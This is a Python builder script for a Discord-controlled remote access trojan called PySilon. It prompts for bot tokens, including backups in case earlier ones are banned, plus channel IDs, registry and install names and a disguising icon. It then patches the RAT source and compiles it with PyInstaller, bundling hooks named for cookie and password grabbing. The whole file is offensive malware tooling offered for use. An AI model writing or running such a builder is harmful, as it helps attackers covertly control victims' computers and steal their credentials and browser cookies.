import os
import sys
import hashlib
from tkinter import Tk, filedialog

def get_file_hash(path):
    sha256_hash = hashlib.sha256()
    with open(path,"rb") as f:
        for byte_block in iter(lambda: f.read(16777216),b""):
            sha256_hash.update(byte_block)
        return sha256_hash.hexdigest()

def get_file_path():
    root = Tk()
    root.withdraw()
    root.attributes('-topmost', True)
    open_dir = filedialog.askopenfilename(filetypes=[('Image files', '.jpg .png'), ('Copy from other executable', '.exe')])
    root.destroy()
    return open_dir

mode = int(input('[1] signle\n[2] multi\nDo you want to build single-target RAT or multi-target RAT? '))
if mode == 1:
    settings_prompts = [
        'Info channel ID: ',
        'Main channel ID: ',
        'Spam channel ID: ',
        'File channel ID: ',
        'Recordings channel ID: ',
        'Voice channel ID: ',
        'Discord BOT token: ',
        'Software registry name: ',
        'Software directory name (default -> REGISTRY_NAME): ',
        'Software executable name (default -> DIRECTORY_NAME + .exe): '
    ]
elif mode == 2:
    tokens = []
    tokens_prompts = [
        'Discord BOT token: ',
        'Discord secondary BOT token (in case of first one getting banned; leave empty if you don\'t want to use secondary token): ',
        'Discord third BOT token (in case of both first and second ones getting banned; leave empty if you don\'t want to use third token): '
    ]
    settings_prompts = [
        'Software registry name: ',
        'Software directory name (default -> REGISTRY_NAME): ',
        'Software executable name (default -> DIRECTORY_NAME + .exe): '
    ]
else: print('You can choose from 2 options.'); sys.exit(0)

settings = []
icon_path = ''

if mode == 1:
    for setting in settings_prompts:
        settings.append(input(setting))
else:
    guild_id = input('Controller Discord Server\'s ID: ')
    tokens.append(input(tokens_prompts[0]))
    tokens.append(input(tokens_prompts[1]))
    if tokens[1] != '': tokens.append(input(tokens_prompts[2]))
    for setting in settings_prompts:
        settings.append(input(setting))

if input('Would you like to set a custom icon to compiled executable? Y/n ').lower() == 'y':
    icon_path = get_file_path()

pyinstaller_command = 'start cmd /k "title Building file...' + ' '*240 + '& pyinstaller -F --add-data "resources/libopus-0.x64.dll;." --runtime-hook=resources/misc.py --runtime-hook=resources/get_cookies.py --runtime-hook=resources/passwords_grabber.py ' + (('--icon "' + icon_path + '" ') if icon_path != '' else '') + '"main_prepared.py" & echo - & echo.Done & echo.- & pause & exit"'
# Uncomment if you want to use pre-downloaded PyInstaller #pyinstaller_command = 'start cmd /k "title Building file...' + ' '*240 + '& pyinstaller -F --runtime-hook=resources/misc.py --runtime-hook=resources/get_cookies.py --runtime-hook=resources/passwords_grabber.py ' + (('--icon "' + icon_path + '" ') if icon_path != '' else '') + '"main_prepared.py" & echo - & echo.Done & echo.- & pause & exit"'

with open('PySilon.key', 'wb') as save_key: save_key.write(os.urandom(1024*1024))
with open('main.py', 'r', encoding='utf-8') as copy_source_code: source_code = copy_source_code.readlines()
with open('main_prepared.py', 'w', encoding='utf-8') as edit_source_code:
    for line in range(len(source_code)):
        if mode == 1:
            match line:
                case 46: edit_source_code.write('bot_tokens = [\'' + settings[6] + '\']\n')
                case 47: edit_source_code.write('software_registry_name = \'' + settings[7] + '\'\n')
                case 48: edit_source_code.write('software_directory_name = \'' + (settings[8] if settings[8] != '' else settings[7]) + '\'\n')
                case 49: edit_source_code.write('software_executable_name = \'' + (settings[9] if settings[9] != '' else (settings[8] if settings[8] != '' else settings[7]) + '.exe') + '\'\n')
                case 52: edit_source_code.write('    \'info\': ' + settings[0] + ',\n')
                case 53: edit_source_code.write('    \'main\': ' + settings[1] + ',\n')
                case 54: edit_source_code.write('    \'spam\': ' + settings[2] + ',\n')
                case 55: edit_source_code.write('    \'file\': ' + settings[3] + ',\n')
                case 56: edit_source_code.write('    \'recordings\': ' + settings[4] + ',\n')
                case 57: edit_source_code.write('    \'voice\': ' + settings[5] + '\n')
                case 60: edit_source_code.write('secret_key = \'' + get_file_hash('PySilon.key') + '\'   # Don\'t touch this line (just leave)\n')
                case _: edit_source_code.write(source_code[line])
        else:
            match line:
                case 46: edit_source_code.write('bot_tokens = [\'' + ('\', \''.join(tokens) if tokens[-1] != '' else '\', \''.join(tokens[:-1])) + '\']\n')
                case 47: edit_source_code.write('software_registry_name = \'' + settings[0] + '\'\n')
                case 48: edit_source_code.write('software_directory_name = \'' + (settings[1] if settings[1] != '' else settings[0]) + '\'\n')
                case 49: edit_source_code.write('software_executable_name = \'' + (settings[2] if settings[2] != '' else ((settings[1] if settings[1] != '' else settings[0]) + '.exe')) + '\'\n')
                case 52: edit_source_code.write('    \'info\': None,\n')
                case 53: edit_source_code.write('    \'main\': None,\n')
                case 54: edit_source_code.write('    \'spam\': None,\n')
                case 55: edit_source_code.write('    \'file\': None,\n')
                case 56: edit_source_code.write('    \'recordings\': None,\n')
                case 57: edit_source_code.write('    \'voice\': None\n')
                case 60: edit_source_code.write('secret_key = \'' + get_file_hash('PySilon.key') + '\'   # Don\'t touch this line (just leave)\n')
                case 61: edit_source_code.write('guild_id = ' + guild_id + '\n')
                case _: edit_source_code.write(source_code[line])

os.system(pyinstaller_command)
input('Press ENTER after processing ends...')
